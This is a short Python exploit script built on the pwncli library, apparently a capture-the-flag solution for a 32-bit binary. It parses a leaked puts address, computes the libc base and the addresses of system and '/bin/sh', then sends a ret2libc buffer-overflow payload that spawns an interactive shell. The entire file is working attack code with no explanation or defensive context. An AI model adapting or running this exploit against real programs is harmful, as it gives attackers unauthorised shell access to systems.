
#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io']
elf: ELF = gift['elf']
#libc: ELF = gift['libc']
libc=ELF('./libc.so.6')

ru('0x')
puts_addr=int(r(12),16)

libc_base=puts_addr-libc.sym['puts']
system=libc_base+libc.sym['system']
binsh=libc_base+libc.search(b'/bin/sh').__next__()

payload=b'a'*0x10+p32(system)+p32(0)+p32(binsh)
s(payload)

ia()

